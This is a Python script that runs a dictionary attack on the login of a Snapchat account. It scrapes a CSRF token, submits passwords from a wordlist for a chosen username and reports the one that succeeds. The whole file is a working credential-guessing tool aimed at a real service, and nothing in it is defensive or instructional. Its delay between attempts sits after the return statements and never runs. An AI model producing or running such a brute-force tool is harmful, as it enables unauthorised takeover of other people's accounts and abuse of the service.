import requests
from bs4 import BeautifulSoup
import sys
import time

def attempt_login(username, password, delay=1):
    """
    Attempts to log in to Snapchat with the given username and password.

    Args:
        username (str): The Snapchat username.
        password (str): The password to try.
        delay (int, optional): Time to wait between login attempts, defaults to 1 second.

    Returns:
        bool: True if login is successful, False otherwise.
    """
    # Snapchat's login URL.
    login_url = "https://accounts.snapchat.com/accounts/login"

    # Create a session to maintain cookies.  This is important for login.
    session = requests.Session()

    # 1.  Get the initial login page to obtain the CSRF token.
    try:
        response = session.get(login_url)
        response.raise_for_status()  # Raise an exception for bad status codes
    except requests.exceptions.RequestException as e:
        print(f"Error fetching login page: {e}")
        return False  # Explicitly return False on error

    soup = BeautifulSoup(response.content, "html.parser")
    # Snapchat uses a CSRF token for security.  We need to extract it.
    csrf_token = soup.find("input", {"name": "csrf_token"})
    if not csrf_token:
        print("Error: CSRF token not found on login page.")
        return False  # Explicitly return False if token is missing
    csrf_token_value = csrf_token["value"]

    # 2.  Prepare the login data, including the CSRF token, username, and password.
    login_data = {
        "username": username,
        "password": password,
        "csrf_token": csrf_token_value,
        "remember_me": "true",  # Add the remember_me field
    }

    # 3.  Send the login request.  Use a try-except block for error handling.
    try:
        response = session.post(login_url, data=login_data)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error during login attempt: {e}")
        return False

    # 4.  Check for login success.  This is the trickiest part, as Snapchat's
    #     response might not be a simple "200 OK" or a specific status code.
    #     We'll look for a redirect or the absence of an error message in the response.
    #     A redirect to the main Snapchat page is a good indicator of success.
    #     We'll also check for specific error messages in the response text.
    if response.url == "https://accounts.snapchat.com/accounts/login":
        if "Incorrect username or password" in response.text:
            return False
        elif "Please check your username and try again" in response.text:
            return False
        else:
            print("Login failed, but no specific error message found.  Check manually.")
            return False
    elif "accounts/login" not in response.url:
        return True #Assume any url not containing accounts/login is success.

    # 5.  Introduce a delay to avoid overwhelming the server.  Important!
    time.sleep(delay)
    return False  # Default to False if none of the success conditions are met.


def main():
    """
    Main function to run the login attempt program.
    """
    if len(sys.argv) != 3:
        print("Usage: python snapchat_login_attemptor.py <username> <password_wordlist.txt>")
        sys.exit(1)

    username = sys.argv[1]
    wordlist_file = sys.argv[2]

    try:
        with open(wordlist_file, "r") as f:
            passwords = [line.strip() for line in f]  # Read passwords and remove newlines
    except FileNotFoundError:
        print(f"Error: Wordlist file '{wordlist_file}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading wordlist file: {e}")
        sys.exit(1)

    print(f"Attempting to log in to Snapchat as '{username}' using passwords from '{wordlist_file}'...")

    for password in passwords:
        print(f"Trying password: {password}")
        if attempt_login(username, password):
            print(f"Success!  Password is: {password}")
            sys.exit(0)  # Exit the program on success

    print("Failed to log in using any password from the wordlist.")
    sys.exit(1)  # Exit with an error code to indicate failure


if __name__ == "__main__":
    # Check if BeautifulSoup is installed
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        print("Error: BeautifulSoup is not installed.  Please install it using 'pip install beautifulsoup4'")
        sys.exit(1)
    main()

